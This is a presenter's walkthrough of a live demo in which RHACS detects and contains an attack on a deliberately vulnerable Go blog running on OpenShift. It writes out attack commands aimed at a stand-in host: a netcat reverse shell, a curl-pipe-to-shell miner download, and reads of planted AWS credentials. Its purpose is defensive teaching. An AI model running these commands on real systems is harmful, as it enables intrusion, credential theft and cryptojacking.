  • [ ] Do not disturb on. Notifications off. Other apps closed
  • [ ] Water on the table
  • [ ] Backup: WALKTHROUGH.md or TALK.html open in a tab. If anything breaks live, say "Let me show you this morning's run", use the screenshots, and keep going

docs.title: The Unhackable Blog — end-to-end walkthrough
docs.text:
Every screenshot below was captured from a real run of this demo on OpenShift Local (CRC 2.64, OpenShift 4.22) with RHACS 5.0.0, driven by scripts/demo.sh and scripts/attacker.sh. Nothing is mocked. How to set it up: ../README.md. The talk built on it: TALK.md.

The story in one line: a blog with zero CVEs and the lowest risk in the cluster is breached through a bug in its own code. RHACS sees every attacker move — recon, credential theft, lateral movement, a reverse shell and a crypto miner talking to an external attacker — then kills the pod and a NetworkPolicy contains it. 0 CVEs is where security starts, not where it ends.

Act What the audience sees 1 Unhackable 0 CVEs, minimal risk, no violations 2 Day zero "Check links" → remote code execution → Unauthorized process 3 Loot honeytoken, card data from payments-api → Honeytoken, Lateral movement 4 Persistence & profit reverse shell + crypto miner to attacker.example.local → network graph 5 Respond RHACS kills the pod, the shell dies, NetworkPolicy blocks egress 6 Fix forward v2: no shell, still 0 CVEs, exploit is dead

Cast

Who Where 🛡️ Unhackable Blog — Go, one dependency (yaegi, 0 CVEs), Alpine 3.24, non-root, read-only rootfs, no SA token unhackable/blog 💳 payments-api — the crown jewels, internal only payments/payments-api ☠️ The attacker — attacker.example.local → 1.2.3.4, a public address on the presenter's laptop, outside the cluster scripts/attacker.sh

docs.title: Act 1 — Unhackable
docs.text:
"Meet the Unhackable Blog. Marketing says it can't be hacked. Let's ask RHACS."

The blog is a polished product: posts, an editor, and a brand-new Check links feature.

The editor checks every link in a draft before publishing. It works, and writers love it.

scripts/demo.sh act1

Vulnerability Management → Images without CVEs. New in the RHACS 5 UI: a dedicated view for images with nothing to fix. unhackable/blog:v1 is there — Alpine 3.24, scanned by Scanner V4.

Open the image: 0 critical, 0 important, 0 moderate, 0 low, 0 fixable. A static Go binary with one third-party module (yaegi — 0 CVEs) on a fully upgraded Alpine with apk removed.

Risk → blog. The only risk indicators are two writable volumes, one mounted secret and a port inside the cluster. Non-root, read-only root filesystem, all capabilities dropped, no service account token.

Violations: none.

💬 "0 CVEs. Hardened. Every gate is green. If this were your app, you'd ship it. So — is it secure?"

docs.title: Act 2 — Day zero
docs.text:
"Under the hood, Check links evaluates your 'rule' as Go, in an interpreter we handed exec.Command. So a rule can run commands."

scripts/demo.sh act2

The attacker sends a "rule" that runs id, uname, cat /etc/os-release. They come back: remote code execution, as OpenShift's random non-root UID.

💬 "That's not a CVE. There's no package to upgrade, no advisory, no scanner signature. It's our code — CWE-94, code injection."

Seconds later, in Violations: TDR – Unauthorized process in the Unhackable Blog (Critical), plus the built-in Unauthorized Process Execution.

Open it: exactly the attacker's binaries — /usr/bin/id, /bin/uname, /bin/cat, /usr/bin/head — with container ID, UID and arguments.

How: RHACS learned the blog's process baseline and the setup locked it to exactly one binary: /usr/local/bin/blog. The app validates links natively and runs rules in-process, so it never spawns a child — the baseline is one process. Anything else is an attack, and RHACS catches it. Baselines beat signatures.

docs.title: Act 3 — Living off the land: loot
docs.text:
"An attacker's first move: find credentials. Hardening makes this hard…"

scripts/demo.sh act3

No service account token. Nothing in the environment. But there's ~/.aws/credentials and the app's /opt/blog/.env… The attacker then probes the Kubernetes API and reads card data from payments-api.

💬 "Those AWS keys are fake. We planted them. The app never touches that file — so the only thing that ever will is an attacker. It's a honeytoken."

TDR – Honeytoken touched: decoy AWS credentials — /bin/cat with the argument ~/.aws/credentials and /opt/blog/.env.

TDR – Unexpected network flow to payments-api (Critical). payments-api's network baseline is empty and locked — nothing legitimate ever calls it. Source blog (namespace unhackable), destination payments-api:8080/TCP.

The Network Graph shows the new edge blog → payments-api.

docs.title: Act 4 — Persistence and profit
docs.text:
"HTTP requests are slow and noisy. The attacker wants an interactive shell — and money."

The attacker is outside the cluster: attacker.example.local resolves (through the attacker's own nameserver) to 1.2.3.4 on the presenter's laptop. Second terminal:

scripts/attacker.sh c2        # reverse-shell listener on attacker.example.local:4444
scripts/demo.sh act4          # main terminal
  1. Reverse shell — nc attacker.example.local 4444 -e /bin/sh.
  2. Crypto miner — curl -s http://attacker.example.local:8080/stage.sh | sh: the root FS is read-only and /dev/shm is noexec, but /tmp is writable. xmrig lands in /tmp/.cache, gets chmod +x, starts and connects to attacker.example.local:3333. (A harmless simulator.)

On the attacker's laptop, the shell arrives — id, ps run inside the "unhackable" pod, and the miner is visible:

The attacker's servers log the download, the DNS lookups and the miner's shares:

Violations fill up: Reverse shell tool executed, Crypto miner, Container drift, Unauthorized process — and RHACS's built-ins Netcat Execution Detected and Cryptocurrency Mining Process Execution.

TDR – Crypto miner in the Unhackable Blog: /tmp/.cache/xmrig executed with -o stratum+tcp://attacker.example.local:3333.

TDR – Container drift: file dropped or made executable — RHACS 5.0 File Activity Monitoring: /tmp/.cache/xmrig created by a process in the container, then permission changed. The blog never writes to /tmp, so any new file there is drift from the image.

TDR – Reverse shell tool executed: nc connecting to attacker.example.local 4444 with -e /bin/sh.

Network Graph. The attacker appears outside the cluster as its own named entity, attacker.example.local, next to generic External Entities:

Select blog → Flows: RHACS flags 4 anomalous flows against the locked network baseline — payments-api, the Kubernetes API and the attacker.

Select attacker.example.local (1.2.3.4/32): three active flows from blog, each marked anomalous — 4444/TCP (reverse shell), 3333/TCP (mining pool), 8080/TCP (payload download).

💬 "Every step was detected within seconds, each one mapped to MITRE ATT&CK. But seeing isn't stopping. The miner is still running and the shell is still open."

docs.title: Act 5 — Respond
docs.text:
"Stop the bleeding, then close the door."

scripts/demo.sh act5

Step 1 — kill: shrink the blast radius. The TDR policies switch to Kill Pod. They are SecurityPolicy custom resources — policy as code (Origin: Externally managed in the UI).

The attacker comes back and runs id… RHACS kills the pod within a second; Kubernetes replaces it with a clean one from the original image — no miner, no /tmp/.cache, no shell. Every new attempt costs the attacker the pod: the blast radius is one command, and we've bought time.

Step 2 — network enforcement: close the door. A NetworkPolicy lets the blog reach only DNS and the internet on 80/443. Even the app itself, making an in-process HTTP call (no new process to kill), now can't reach the attacker: attacker.example.local:8080 times out.

On the attacker's laptop, the shell goes silent:

OpenShift records each kill as an event from StackRox:

Violations → Enforced: N times on TDR – Unauthorized process — one kill per attempt.

Enforcement tab: "Enforcement 'Kill Pod' has been applied 4 times. StackRox killed pods in deployment in response to this policy violation."

💬 "The kill stopped this attacker. The NetworkPolicy stops the next one before the first packet leaves."

What can trigger the kill? Tested on RHACS 5.0: process events ✓ and file activity events ✓ kill the pod (measured: 0.69 s from nc to kill); network-flow anomalies only alert — Central accepts Kill Pod on such a policy but no pod is killed. Network anomalies are answered with a NetworkPolicy: step 2.

docs.title: Act 6 — Fix forward
docs.text:
"Root cause: our code evaluated an untrusted 'rule' as Go — and gave it exec.Command."

v2 removes the rule engine. It parses the URL, allows only http/https and uses Go's HTTP client — no interpreter, no child process:

scripts/demo.sh act6

v2 rolls out — still 0 CVEs — and the payload is now rejected: not a valid http(s) URL.

The feature still works, now with the native checker:

💬 "Three layers. Shift-left kept the image clean — zero CVEs. Runtime detection caught the attack the scanner could never see. Enforcement and network policy stopped it. You need all three."

docs.title: Reset for the next run
docs.text:
scripts/demo.sh reset     # enforcement off, NetworkPolicies removed, v1, fresh pods, violations resolved

reset also recreates payments-api so the lateral-movement flow is new again (RHACS raises a baseline anomaly the first time a flow between two deployments appears).
